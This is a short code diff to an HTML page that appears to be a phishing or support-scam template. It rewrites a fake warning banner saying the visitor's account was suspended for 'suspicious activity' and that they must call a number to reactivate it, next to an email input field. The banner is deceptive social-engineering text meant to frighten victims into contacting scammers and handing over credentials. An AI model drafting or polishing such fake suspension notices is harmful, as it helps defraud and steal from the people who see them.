@@ -71,7 +71,8 @@ ul li{
             
             <center><img src="download.png" class="img-responsive" style="margin-top: 5%; width: 120px;"></center>
       <div class="form-group">
-             <div id="result"><ul><li><i class="fa fa-warning"></i>&nbsp;&nbsp;Your account has been block due to suspicious activity<br>Please contact customer care toll free number</li> </ul>
+             <div id="result"><ul><li><i class="fa fa-warning"></i>A suspicious activity has been detected on your account. Due to security reasins we have temporarily suspended your account<br>
+ 				Please call on to reactivate your account</li> </ul>
           </div>
        <div class="form-group">
              <input type="text" name="email" id="email" maxlength="50" class="form-control input-lg" placeholder="Email">
